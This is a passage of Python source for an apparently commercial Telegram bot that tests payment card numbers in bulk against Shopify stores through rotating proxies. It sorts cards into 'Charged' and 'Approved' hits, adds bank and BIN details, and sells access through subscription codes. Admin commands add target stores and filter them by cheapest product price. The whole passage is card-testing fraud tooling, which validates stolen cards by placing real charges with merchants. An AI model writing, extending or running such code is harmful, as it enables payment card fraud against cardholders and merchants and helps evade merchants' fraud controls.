        await event.edit(premium_emoji("❌ Cancelled."), buttons=get_admin_menu_keyboard(), parse_mode='html')
        return
    
    if not event.is_reply or not event.reply_to_msg_id:
        await event.edit(premium_emoji("❌ Reply to a .txt file"), buttons=get_admin_menu_keyboard(), parse_mode='html')
        return
    
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.edit(premium_emoji("❌ Please reply to a .txt file"), buttons=get_admin_menu_keyboard(), parse_mode='html')
        return
    
    path = await reply.download_media()
    async with aiofiles.open(path, 'r') as f:
        content = await f.read()
    new_sites = [l.strip().replace('https://', '').replace('http://', '').rstrip('/') for l in content.split('\n') if l.strip()]
    os.remove(path)
    
    if not new_sites:
        await event.edit(premium_emoji("❌ No valid sites found"), buttons=get_admin_menu_keyboard(), parse_mode='html')
        return
    
    user_pending_sites[event.sender_id] = {
        'action': 'add',
        'sites': new_sites,
        'expires': time.time() + PENDING_TIMEOUT
    }
    
    await event.edit(premium_emoji(f"💰 <b>Select price range to filter sites:</b>\n\n{len(new_sites)} sites found.\nSites with cheapest product above selected range will be removed."), buttons=get_price_filter_keyboard(), parse_mode='html')

async def admin_callback_handler(event, action):
    if event.text and event.text.lower() == '/cancel':
        await event.edit(premium_emoji("❌ Cancelled."), buttons=get_admin_menu_keyboard(), parse_mode='html')
        return
    
    if action == "admin_block":
        try:
            target = int(event.text.strip())
            block_user(target)
            await event.edit(premium_emoji(f"✅ Blocked {target}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
        except:
            await event.edit(premium_emoji("❌ Invalid user ID"), buttons=get_admin_menu_keyboard(), parse_mode='html')
    
    elif action == "admin_unblock":
        try:
            target = int(event.text.strip())
            unblock_user(target)
            await event.edit(premium_emoji(f"✅ Unblocked {target}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
        except:
            await event.edit(premium_emoji("❌ Invalid user ID"), buttons=get_admin_menu_keyboard(), parse_mode='html')
    
    elif action == "admin_broadcast":
        msg = event.text.strip()
        users = get_all_users()
        sent = 0
        for uid in users:
            try:
                await send_with_retry(int(uid), premium_emoji(f"📢 {msg}"), parse_mode='html')
                sent += 1
                await asyncio.sleep(0.1)
            except:
                pass
        await event.edit(premium_emoji(f"✅ Sent to {sent}/{len(users)}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
    
    elif action == "admin_set_limit":
        try:
            parts = event.text.strip().split()
            target = int(parts[0])
            hours = int(parts[1])
            seconds = hours * 3600
            
            users = load_users()
            uid_str = str(target)
            if uid_str not in users:
                users[uid_str] = {}
            
            now = time.time()
            current_expiry = users[uid_str].get('subscription_expiry', 0)
            if current_expiry > now:
                new_expiry = current_expiry + seconds
            else:
                new_expiry = now + seconds
            
            users[uid_str]['subscription_expiry'] = new_expiry
            users[uid_str]['premium'] = True
            save_users(users)
            await event.edit(premium_emoji(f"✅ Added {hours} hours to user {target}"), buttons=get_admin_menu_keyboard(), parse_mode='html')
        except:
            await event.edit(premium_emoji("❌ Usage: user_id hours"), buttons=get_admin_menu_keyboard(), parse_mode='html')

# ==================== أوامر المستخدمين ====================
@bot.on(events.NewMessage(pattern='/help'))
async def help_cmd(event):
    await start(event)

@bot.on(events.NewMessage(pattern='/profile'))
async def profile_cmd(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("🚫 Banned"), parse_mode='html')
        return
    sender = await event.get_sender()
    username = sender.username or f"user_{user_id}"
    first_name = sender.first_name or "User"
    users = load_users()
    data = users.get(str(user_id), {})
    proxies = len(load_user_proxies(user_id))
    reg = data.get('registered_at', datetime.now().isoformat())[:10]
    is_active, expiry = get_user_subscription(user_id)
    
    if is_active:
        expiry_str = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
        sub_status = f"✅ Active until {expiry_str}"
    else:
        sub_status = "❌ No active subscription"
    
    sites_count = len(load_sites())
    
    txt = f"""<b>👤 Profile</b>
├ 🆔 ID: <code>{user_id}</code>
├ 👤 Name: {first_name}
├ 📝 Username: @{username}
├ 🌐 Total Sites: {sites_count}
├ 🔌 Your Proxies: {proxies}
├ ⭐ Status: {'👑 ADMIN' if is_admin(user_id) else '✅ PREMIUM' if is_active else '❌ FREE'}
├ 📅 Registered: {reg}
└ ⭐ Subscription: {sub_status}"""
    await send_with_retry(user_id, premium_emoji(txt), buttons=get_commands_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/mysites'))
async def mysites_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("❌ Only admin can view sites."), parse_mode='html')
        return
    sites = load_sites()
    if not sites:
        await send_with_retry(user_id, premium_emoji("📋 No sites found."), parse_mode='html')
        return
    if len(sites) <= 30:
        await send_with_retry(user_id, premium_emoji(f"📋 <b>Sites ({len(sites)}):</b>\n\n" + "\n".join(f"• {s}" for s in sites)), parse_mode='html')
    else:
        path = f"sites_temp.txt"
        async with aiofiles.open(path, 'w') as f:
            await f.write("\n".join(sites))
        await send_with_retry(user_id, f"📋 {len(sites)} sites", file=path, parse_mode='html')
        os.remove(path)

# ==================== أوامر إدارة المواقع (لأدمن فقط) ====================
@bot.on(events.NewMessage(pattern=r'^/site\s+'))
async def add_site_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("❌ Only admin can add sites."), parse_mode='html')
        return
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        await send_with_retry(user_id, premium_emoji("❌ Usage: /site domain.com"), parse_mode='html')
        return
    site = args[1].replace('https://', '').replace('http://', '').rstrip('/')
    
    proxies = load_user_proxies(user_id)
    if not proxies:
        await send_with_retry(user_id, premium_emoji("❌ Add proxies first using /addproxy"), parse_mode='html')
        return
    
    msg = await send_with_retry(user_id, premium_emoji(f"🔄 Testing {site}..."), parse_mode='html')
    result = await test_site_basic(site, random.choice(proxies))
    
    if result['status'] == 'alive':
        sites = load_sites()
        if site not in sites:
            save_sites(sites + [site])
            await msg.edit(premium_emoji(f"✅ Site added: {site}"), parse_mode='html')
        else:
            await msg.edit(premium_emoji(f"⚠️ Site already exists: {site}"), parse_mode='html')
    else:
        await msg.edit(premium_emoji(f"❌ Site dead: {site}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmsite\s+'))
async def rmsite_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("❌ Only admin can remove sites."), parse_mode='html')
        return
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        await send_with_retry(user_id, premium_emoji("❌ Usage: /rmsite domain.com"), parse_mode='html')
        return
    site = args[1]
    sites = load_sites()
    if site not in sites:
        await send_with_retry(user_id, premium_emoji(f"❌ Site not found"), parse_mode='html')
        return
    save_sites([s for s in sites if s != site])
    await send_with_retry(user_id, premium_emoji(f"✅ Removed: {site}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearsites'))
async def clearsites_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("❌ Only admin can clear sites."), parse_mode='html')
        return
    count = len(load_sites())
    if count == 0:
        await send_with_retry(user_id, premium_emoji("❌ No sites to clear."), parse_mode='html')
        return
    save_sites([])
    await send_with_retry(user_id, premium_emoji(f"✅ Cleared all {count} sites!"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addsites'))
async def addsites_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("❌ Only admin can add sites."), parse_mode='html')
        return
    if not event.is_reply:
        await send_with_retry(user_id, premium_emoji("❌ Reply to a .txt file containing sites"), parse_mode='html')
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await send_with_retry(user_id, premium_emoji("❌ Reply to a .txt file"), parse_mode='html')
        return
    path = await reply.download_media()
    async with aiofiles.open(path, 'r') as f:
        content = await f.read()
    new_sites = [l.strip().replace('https://', '').replace('http://', '').rstrip('/') for l in content.split('\n') if l.strip()]
    os.remove(path)
    if not new_sites:
        await send_with_retry(user_id, premium_emoji("❌ No valid sites found"), parse_mode='html')
        return
    
    user_pending_sites[user_id] = {
        'action': 'add',
        'sites': new_sites,
        'expires': time.time() + PENDING_TIMEOUT
    }
    
    await send_with_retry(user_id, premium_emoji(f"💰 <b>Select price range to filter sites:</b>\n\n{len(new_sites)} sites found.\nSites with cheapest product above selected range will be removed.\n\nYou have 5 minutes to select."), buttons=get_price_filter_keyboard(), parse_mode='html')

# ==================== فحص المواقع مع فلتر السعر ====================
@bot.on(events.NewMessage(pattern='/sitecheck'))
async def sitecheck_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("❌ Only admin can check sites."), parse_mode='html')
        return
    
    sites = load_sites()
    if not sites:
        await send_with_retry(user_id, premium_emoji("❌ No sites to check."), parse_mode='html')
        return
    
    proxies = load_user_proxies(user_id)
    if not proxies:
        await send_with_retry(user_id, premium_emoji("❌ No proxies available. Add proxies first."), parse_mode='html')
        return
    
    user_pending_sites[user_id] = {
        'action': 'check',
        'sites': sites,
        'expires': time.time() + PENDING_TIMEOUT
    }
    
    await send_with_retry(user_id, premium_emoji("💰 <b>Select price range to filter sites:</b>\n\nSites with cheapest product above selected range will be removed.\n\nChoose 'No filter' to keep all working Shopify sites."), buttons=get_price_filter_keyboard(), parse_mode='html')

# ==================== أوامر إدارة البروكسيات السريعة ====================
@bot.on(events.NewMessage(pattern='/addproxy'))
async def addproxy_cmd(event):
    user_id = event.sender_id
    lines = event.text.split('\n')[1:]
    if not lines:
        await send_with_retry(user_id, premium_emoji("❌ Send proxies after command, one per line\n\nExample:\n/addproxy\nip:port:user:pass\nip:port"), parse_mode='html')
        return
    current = load_user_proxies(user_id)
    new = [p.strip() for p in lines if p.strip() and p.strip() not in current]
    if not new:
        await send_with_retry(user_id, premium_emoji("⚠️ No new proxies"), parse_mode='html')
        return
    async with aiofiles.open(get_user_proxy_file(user_id), 'a') as f:
        for p in new:
            await f.write(f"{p}\n")
    await send_with_retry(user_id, premium_emoji(f"✅ Added {len(new)} proxies\nTotal: {len(current) + len(new)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addproxies'))
async def addproxies_cmd(event):
    user_id = event.sender_id
    if not event.is_reply:
        await send_with_retry(user_id, premium_emoji("❌ Reply to a .txt file containing proxies"), parse_mode='html')
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await send_with_retry(user_id, premium_emoji("❌ Reply to a .txt file"), parse_mode='html')
        return
    path = await reply.download_media()
    async with aiofiles.open(path, 'r') as f:
        proxies = [l.strip() for l in (await f.read()).split('\n') if l.strip()]
    os.remove(path)
    if not proxies:
        await send_with_retry(user_id, premium_emoji("❌ No valid proxies found"), parse_mode='html')
        return
    current = load_user_proxies(user_id)
    new = [p for p in proxies if p not in current]
    if new:
        async with aiofiles.open(get_user_proxy_file(user_id), 'a') as f:
            for p in new:
                await f.write(f"{p}\n")
    await send_with_retry(user_id, premium_emoji(f"✅ Added {len(new)} proxies\nTotal: {len(current) + len(new)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chkproxy'))
async def chkproxy_cmd(event):
    user_id = event.sender_id
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        await send_with_retry(user_id, premium_emoji("❌ Usage: /chkproxy ip:port:user:pass"), parse_mode='html')
        return
    msg = await send_with_retry(user_id, premium_emoji(f"🔄 Checking..."), parse_mode='html')
    res = await test_proxy_fast(args[1])
    if res['status'] == 'alive':
        await msg.edit(premium_emoji(f"✅ <b>ALIVE</b>\n<code>{args[1]}</code>"), parse_mode='html')
    else:
        await msg.edit(premium_emoji(f"❌ <b>DEAD</b>\n{res['reason']}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmproxy'))
async def rmproxy_cmd(event):
    user_id = event.sender_id
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        await send_with_retry(user_id, premium_emoji("❌ Usage: /rmproxy ip:port"), parse_mode='html')
        return
    proxies = load_user_proxies(user_id)
    if args[1] not in proxies:
        await send_with_retry(user_id, premium_emoji(f"❌ Proxy not found"), parse_mode='html')
        return
    save_user_proxies(user_id, [p for p in proxies if p != args[1]])
    await send_with_retry(user_id, premium_emoji(f"✅ Removed"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clearproxy_cmd(event):
    user_id = event.sender_id
    count = len(load_user_proxies(user_id))
    if count == 0:
        await send_with_retry(user_id, premium_emoji("❌ No proxies to clear"), parse_mode='html')
        return
    save_user_proxies(user_id, [])
    await send_with_retry(user_id, premium_emoji(f"✅ Cleared {count} proxies"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_check_cmd(event):
    user_id = event.sender_id
    proxies = load_user_proxies(user_id)
    if not proxies:
        await send_with_retry(user_id, premium_emoji("❌ No proxies to check\n\nAdd proxies using:\n/addproxy ip:port:user:pass\n/addproxies (reply to .txt)"), parse_mode='html')
        return
    
    total = len(proxies)
    msg = await send_with_retry(user_id, premium_emoji(f"⚡ Fast checking {total} proxies...\n\n⏱️ Estimated: ~{max(3, total // 15)} seconds"), parse_mode='html')
    
    batch_size = 20
    alive = []
    dead = []
    checked = 0
    
    for i in range(0, total, batch_size):
        batch = proxies[i:i+batch_size]
        tasks = [test_proxy_fast(p) for p in batch]
        results = await asyncio.gather(*tasks)
        
        for res in results:
            if res['status'] == 'alive':
                alive.append(res['proxy'])
            else:
                dead.append(res['proxy'])
        
        checked += len(batch)
        await msg.edit(premium_emoji(f"⚡ Checking proxies...\n\n📊 {checked}/{total}\n✅ Alive: {len(alive)}\n❌ Dead: {len(dead)}"), parse_mode='html')
    
    save_user_proxies(user_id, alive)
    
    result_text = f"""✅ <b>Proxy Check Complete!</b>

📊 Total: {total}
✅ Alive: {len(alive)}
❌ Dead: {len(dead)}

💡 Your proxies have been updated with only working ones."""
    
    await msg.edit(premium_emoji(result_text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/getproxy'))
async def getproxy_cmd(event):
    user_id = event.sender_id
    proxies = load_user_proxies(user_id)
    if not proxies:
        await send_with_retry(user_id, premium_emoji("❌ No proxies found"), parse_mode='html')
        return
    if len(proxies) <= 30:
        await send_with_retry(user_id, premium_emoji(f"<b>📋 Your Proxies ({len(proxies)}):</b>\n\n" + "\n".join(f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies))), parse_mode='html')
    else:
        path = f"user_proxies_{user_id}.txt"
        async with aiofiles.open(path, 'w') as f:
            for i, p in enumerate(proxies):
                await f.write(f"{i+1}. {p}\n")
        await send_with_retry(user_id, f"📋 {len(proxies)} proxies", file=path, parse_mode='html')
        os.remove(path)

@bot.on(events.NewMessage(pattern='/mcancel'))
async def mcancel_cmd(event):
    user_id = event.sender_id
    for key in list(active_sessions.keys()):
        if key.startswith(f"{user_id}_"):
            del active_sessions[key]
    user_current_check[user_id] = False
    await send_with_retry(user_id, premium_emoji("✅ Mass check cancelled"), parse_mode='html')

# ==================== فحص الكروت ====================
@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_cmd(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("🚫 Banned"), parse_mode='html')
        return
    if user_current_check.get(user_id):
        await send_with_retry(user_id, premium_emoji("⏳ Wait for previous check to finish"), parse_mode='html')
        return
    
    if not is_admin(user_id) and not is_user_subscribed(user_id):
        await send_with_retry(user_id, premium_emoji("❌ No active subscription\n\nBuy: /subscribe\nRedeem: /redeem CODE"), parse_mode='html')
        return
    
    sites = load_sites()
    proxies = load_user_proxies(user_id)
    
    if not sites:
        await send_with_retry(user_id, premium_emoji("❌ No sites available. Contact admin."), parse_mode='html')
        return
    if not proxies:
        await send_with_retry(user_id, premium_emoji("❌ No proxies\n\nAdd proxies using:\n/addproxy ip:port:user:pass\n/addproxies (reply to .txt)"), parse_mode='html')
        return
    
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        await send_with_retry(user_id, premium_emoji("❌ Usage: /cc 4242424242424242|12|25|123"), parse_mode='html')
        return
    
    cards = extract_cc(args[1])
    if not cards:
        await send_with_retry(user_id, premium_emoji("❌ Invalid card format\n\nCorrect format: card|MM|YYYY|CVV"), parse_mode='html')
        return
    
    card = cards[0]
    user_current_check[user_id] = True
    msg = await send_with_retry(user_id, premium_emoji(f"⚡ Checking <code>{card}</code>..."), parse_mode='html')
    
    try:
        res = await check_card_with_retry(card, sites, proxies, 3)
        brand, typ, lvl, bank, country, flag = await get_bin_info(card.split('|')[0])
        
        if res['status'] == 'Charged':
            await send_hit_message(user_id, res, 'Charged')
        elif res['status'] == 'Approved':
            await send_hit_message(user_id, res, 'Approved')
        
        time_left = get_user_time_left(user_id)
        await msg.edit(premium_emoji(f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 Result</b>
<blockquote>{'💎' if res['status']=='Charged' else '✅' if res['status']=='Approved' else '❌'} Status: {res['status'].upper()}</blockquote>
<blockquote>💳 Card: <code>{card}</code></blockquote>
<blockquote>📝 Response: {res['message'][:100]}</blockquote>
<blockquote>🌐 Gateway: {res.get('gateway', 'Unknown')} | 💰 {res.get('price', '-')}</blockquote>
<b>💠 BIN Info</b>
<pre>BIN: {brand} - {typ} - {lvl}
Bank: {bank}
Country: {country} {flag}</pre>
<b>⏱️ Time left: {time_left}</b>"""), parse_mode='html')
    except Exception as e:
        await msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        user_current_check[user_id] = False

# ==================== فحص جماعي ====================
@bot.on(events.NewMessage(pattern='/chk'))
async def mass_check_cmd(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await send_with_retry(user_id, premium_emoji("🚫 Banned"), parse_mode='html')
        return
    if user_current_check.get(user_id):
        await send_with_retry(user_id, premium_emoji("⏳ Wait for previous check to finish"), parse_mode='html')
        return
    
    if not is_admin(user_id) and not is_user_subscribed(user_id):
        await send_with_retry(user_id, premium_emoji("❌ No active subscription\n\nBuy: /subscribe\nRedeem: /redeem CODE"), parse_mode='html')
        return
    
    if not event.is_reply:
        await send_with_retry(user_id, premium_emoji("❌ Reply to a .txt file containing cards"), parse_mode='html')
        return
    
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await send_with_retry(user_id, premium_emoji("❌ Please reply to a .txt file"), parse_mode='html')
        return
    
    sites = load_sites()
    proxies = load_user_proxies(user_id)
    
    if not sites:
        await send_with_retry(user_id, premium_emoji("❌ No sites available. Contact admin."), parse_mode='html')
        return
    if not proxies:
        await send_with_retry(user_id, premium_emoji("❌ No proxies\n\nAdd proxies using:\n/addproxy\n/addproxies (reply to .txt)"), parse_mode='html')
        return
    
    path = await reply.download_media()
    user_pending_mass[user_id] = {'file_path': path, 'expires': time.time() + PENDING_TIMEOUT}
    await send_with_retry(user_id, premium_emoji("📋 Select mode:"), buttons=[
        [Button.inline("💎 CHARGES ONLY", b"mode_charges")],
        [Button.inline("💎 + ✅ ALL HITS", b"mode_all")],
        [Button.inline("❌ Cancel", b"mode_cancel")]
    ], parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"mode_charges|mode_all|mode_cancel"))
async def mode_select(event):
    user_id = event.sender_id
    if user_id not in user_pending_mass:
        await event.answer("Session expired, please use /chk again", alert=True)
        return
    
    if event.data == b"mode_cancel":
        os.remove(user_pending_mass.pop(user_id)['file_path'])
        await event.edit(premium_emoji("❌ Cancelled"), parse_mode='html')
        return
    
    mode = "charges_only" if event.data == b"mode_charges" else "all_hits"
    pending = user_pending_mass.pop(user_id)
    path = pending['file_path']
    
    async with aiofiles.open(path, 'r') as f:
        cards = extract_cc(await f.read())
    os.remove(path)
    
    if not cards:
        await event.edit(premium_emoji("❌ No valid cards found"), parse_mode='html')
        return
    
    max_cards = MAX_CARDS_PER_COMBO if not is_admin(user_id) else ADMIN_MAX_CARDS
    if len(cards) > max_cards:
        await event.edit(premium_emoji(f"⚠️ Max {max_cards} cards per combo.\nYour file has {len(cards)} cards.\nChecking first {max_cards} cards."), parse_mode='html')
        cards = cards[:max_cards]
    
    user_current_check[user_id] = True
    msg = await event.edit(premium_emoji(f"🚀 Starting {len(cards)} cards..."), parse_mode='html')
    session_key = f"{user_id}_{msg.id}"
    active_sessions[session_key] = {'paused': False}
    results = {'charged': [], 'approved': [], 'dead': [], 'total': len(cards), 'checked': 0, 'start': time.time()}
    card_responses = []
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    
    async def worker():
        while not queue.empty() and session_key in active_sessions:
            sess = active_sessions.get(session_key)
            if not sess:
                break
            while sess.get('paused'):
                await asyncio.sleep(1)
                sess = active_sessions.get(session_key)
                if not sess:
                    return
            try:
                card = queue.get_nowait()
            except:
                break
            
            current_sites = load_sites()
            current_proxies = load_user_proxies(user_id)
            if not current_sites or not current_proxies:
                break
            
            res = await check_card_with_retry(card, current_sites, current_proxies, 1)
            results['checked'] += 1
            card_responses.append({'card': card, 'status': res['status'], 'msg': res['message'][:40]})
            
            if res['status'] == 'Charged':
                results['charged'].append(res)
                await send_hit_message(user_id, res, 'Charged')
            elif res['status'] == 'Approved' and mode == 'all_hits':
                results['approved'].append(res)
                await send_hit_message(user_id, res, 'Approved')
            elif res['status'] == 'Approved':
                results['approved'].append(res)
            else:
                results['dead'].append(res)
            
            queue.task_done()
            
            if session_key in active_sessions and results['checked'] % 5 == 0:
                try:
                    elapsed = int(time.time() - results['start'])
                    recent = "\n".join([f"{'💎' if c['status']=='Charged' else '✅' if c['status']=='Approved' else '❌'} {c['card'][:8]}*** | {c['msg'][:30]}" for c in card_responses[-5:]])
                    await msg.edit(premium_emoji(f"""<b>💠 Progress</b>
<blockquote>💎 {len(results['charged'])} | ✅ {len(results['approved'])} | ❌ {len(results['dead'])}</blockquote>
<blockquote>📊 {results['checked']}/{results['total']}</blockquote>
<blockquote>⏱️ {elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>📝 Recent Results:</b>
<code>{recent}</code>"""), buttons=[[Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume"), Button.inline("🛑 Stop", b"stop")]], parse_mode='html')
                except:
                    pass
    
    workers = [asyncio.create_task(worker()) for _ in range(min(MAX_WORKERS, len(cards)))]
    while workers and session_key in active_sessions:
        done, workers = await asyncio.wait(workers, timeout=1.0, return_when=asyncio.FIRST_COMPLETED)
    
    if session_key in active_sessions:
        elapsed = int(time.time() - results['start'])
        hits = "\n".join([f"💎 <code>{r['card']}</code> | {r.get('price', '-')}" for r in results['charged'][:10]])
        if mode == 'all_hits':
            hits += "\n" + "\n".join([f"✅ <code>{r['card']}</code> | {r.get('price', '-')}" for r in results['approved'][:10]])
        if not hits:
            hits = "No hits"
        time_left = get_user_time_left(user_id)
        await msg.edit(premium_emoji(f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ Final Results</b>
<blockquote>💎 {len(results['charged'])} | ✅ {len(results['approved'])} | ❌ {len(results['dead'])}</blockquote>
<blockquote>⏱️ Time: {elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 Hits</b>
<code>{hits}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⏱️ Time left: {time_left}</b>"""), parse_mode='html')
    
    if session_key in active_sessions:
        del active_sessions[session_key]
    user_current_check[user_id] = False

@bot.on(events.CallbackQuery(pattern=b"pause|resume|stop"))
async def control_handler(event):
    user_id = event.sender_id
    session_key = f"{user_id}_{event.message_id}"
    if event.data == b"pause" and session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ Paused")
    elif event.data == b"resume" and session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ Resumed")
    elif event.data == b"stop" and session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("🛑 Stopped")
        await event.edit(premium_emoji("🛑 Stopped by user"), parse_mode='html')

# ==================== أوامر الأدمن ====================
@bot.on(events.NewMessage(pattern='/admin'))
async def admin_cmd(event):
    if not is_admin(event.sender_id):
        await send_with_retry(event.sender_id, premium_emoji("❌ Only admin can use this command."), parse_mode='html')
        return
    await send_with_retry(event.sender_id, premium_emoji("👑 Admin Panel"), buttons=get_admin_menu_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/gencode'))
async def gencode_cmd(event):
    if not is_admin(event.sender_id):
        return
    args = event.text.split()
    hours = 24
    if len(args) > 1:
        try:
            hours = int(args[1])
        except:
            pass
    seconds = hours * 3600
    code = create_activation_code(seconds)
    await send_with_retry(event.sender_id, premium_emoji(f"✅ <b>Code Generated!</b>\n\nCode: <code>{code}</code>\nDuration: {hours} hours"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/block'))
async def block_cmd(event):
    if not is_admin(event.sender_id):
        return
    args = event.text.split()
    if len(args) < 2:
        await send_with_retry(event.sender_id, premium_emoji("❌ Usage: /block user_id"), parse_mode='html')
        return
    try:
        target = int(args[1])
        block_user(target)
        await send_with_retry(event.sender_id, premium_emoji(f"✅ Blocked user {target}"), parse_mode='html')
    except:
        await send_with_retry(event.sender_id, premium_emoji("❌ Invalid user ID"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/unblock'))
async def unblock_cmd(event):
    if not is_admin(event.sender_id):
        return
    args = event.text.split()
    if len(args) < 2:
        await send_with_retry(event.sender_id, premium_emoji("❌ Usage: /unblock user_id"), parse_mode='html')
        return
    try:
        target = int(args[1])
        unblock_user(target)
        await send_with_retry(event.sender_id, premium_emoji(f"✅ Unblocked user {target}"), parse_mode='html')
    except:
        await send_with_retry(event.sender_id, premium_emoji("❌ Invalid user ID"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_cmd(event):
    if not is_admin(event.sender_id):
        return
    msg = event.text.replace('/broadcast', '').strip()
    if not msg:
        await send_with_retry(event.sender_id, premium_emoji("❌ Usage: /broadcast message"), parse_mode='html')
        return
    users = get_all_users()
    sent = 0
    status_msg = await send_with_retry(event.sender_id, premium_emoji(f"📢 Broadcasting to {len(users)} users..."), parse_mode='html')
    for uid in users:
        try:
            await send_with_retry(int(uid), premium_emoji(f"📢 <b>Broadcast</b>\n\n{msg}"), parse_mode='html')
            sent += 1
            await asyncio.sleep(0.2)
        except:
            pass
    await status_msg.edit(premium_emoji(f"✅ Broadcast complete!\n\nSent: {sent}\nFailed: {len(users) - sent}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addtime'))
async def addtime_cmd(event):
    if not is_admin(event.sender_id):
        return
    args = event.text.split()
    if len(args) < 3:
        await send_with_retry(event.sender_id, premium_emoji("❌ Usage: /addtime user_id hours"), parse_mode='html')
        return
    try:
        target = int(args[1])
        hours = int(args[2])
        seconds = hours * 3600
        
        users = load_users()
        uid_str = str(target)
        if uid_str not in users:
            users[uid_str] = {}
        
        now = time.time()
        current_expiry = users[uid_str].get('subscription_expiry', 0)
        if current_expiry > now:
            new_expiry = current_expiry + seconds
        else:
            new_expiry = now + seconds
        
        users[uid_str]['subscription_expiry'] = new_expiry
        users[uid_str]['premium'] = True
        save_users(users)
        await send_with_retry(event.sender_id, premium_emoji(f"✅ Added {hours} hours to user {target}"), parse_mode='html')
    except:
        await send_with_retry(event.sender_id, premium_emoji("❌ Invalid input"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/users'))
async def users_cmd(event):
    if not is_admin(event.sender_id):
        return
    users = get_all_users()
    if not users:
        await send_with_retry(event.sender_id, premium_emoji("No users found"), parse_mode='html')
        return
    txt = "<b>📋 Users List:</b>\n\n"
    for uid, data in list(users.items())[:50]:
        username = data.get('username', '?')
        blocked = "🚫" if data.get('blocked', False) else "✅"
        expiry = data.get('subscription_expiry', 0)
        active = "⭐" if expiry > time.time() else "❌"
        txt += f"<code>{uid}</code> | @{username} | {active} | {blocked}\n"
    await send_with_retry(event.sender_id, premium_emoji(txt), parse_mode='html')

@bot.on(events.NewMessage(pattern='/user'))
async def user_cmd(event):
    if not is_admin(event.sender_id):
        return
    args = event.text.split()
    if len(args) < 2:
        await send_with_retry(event.sender_id, premium_emoji("❌ Usage: /user user_id"), parse_mode='html')
        return
    try:
        target = args[1]
        users = load_users()
        data = users.get(target, {})
        expiry = data.get('subscription_expiry', 0)
        if expiry > 0:
            expiry_str = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')
        else:
            expiry_str = "No subscription"
        txt = f"""<b>👤 User {target}</b>
├ Username: @{data.get('username', '?')}
├ Blocked: {data.get('blocked', False)}
├ Premium: {data.get('premium', False)}
├ Registered: {data.get('registered_at', '?')[:10]}
└ Expires: {expiry_str}"""
        await send_with_retry(event.sender_id, premium_emoji(txt), parse_mode='html')
    except:
        await send_with_retry(event.sender_id, premium_emoji("❌ Invalid user ID"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    if not is_admin(event.sender_id):
        return
    users = get_all_users()
    total = len(users)
    active = 0
    for uid, data in users.items():
        expiry = data.get('subscription_expiry', 0)
        if expiry > time.time():
            active += 1
    blocked = len([u for u in users.values() if u.get('blocked', False)])
    codes = len(load_codes())
    sites = len(load_sites())
    await send_with_retry(event.sender_id, premium_emoji(f"""<b>📊 Bot Statistics</b>

├ 👥 Total Users: {total}
├ ⭐ Active Users: {active}
├ 🚫 Blocked: {blocked}
├ 🌐 Sites: {sites}
├ 🎫 Codes: {codes}
